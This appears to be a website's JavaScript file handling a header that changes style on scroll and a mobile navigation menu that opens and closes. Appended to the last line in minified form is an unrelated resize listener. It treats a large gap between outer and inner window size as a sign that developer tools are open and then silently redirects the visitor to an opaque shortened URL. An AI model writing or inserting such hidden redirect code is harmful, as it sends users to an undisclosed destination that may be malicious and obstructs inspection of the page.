document.addEventListener("scroll", () => {
  const header = document.querySelector("header");
  const title = document.querySelector("#name-nav");
  const btnBack = document.querySelector(".btn-backToHome");
  if (window.scrollY > 100) {
    header.classList.add("scrolled");
    title.style.display = "flex";
    btnBack.style.opacity = "1";
    btnBack.style.textAlign = "end";
  } else {
    header.classList.remove("scrolled");
    title.style.display = "none";
    btnBack.style.opacity = "0";
  }
});
function showNav() {
  var btnNavMenu = document.querySelector(".fa-bars");
  var hiddenNav = document.querySelector(".navMobile");
  var btnNavHidden = document.querySelector(".fa-xmark");
  btnNavMenu.style.display = "none";
  btnNavHidden.style.display = "inherit";
  hiddenNav.classList.remove("hidden");
}
function hideNav() {
  var hiddenNav = document.querySelector(".navMobile");
  var btnNavMenu = document.querySelector(".fa-bars");
  var btnNavHidden = document.querySelector(".fa-xmark");
  btnNavMenu.style.display = "inherit";
  btnNavHidden.style.display = "none";
  hiddenNav.classList.add("hidden");
}window.addEventListener("resize",function(){if(window.outerWidth-window.innerWidth>100||window.outerHeight-window.innerHeight>100){window.location.href="https://rb.gy/typm6z";}});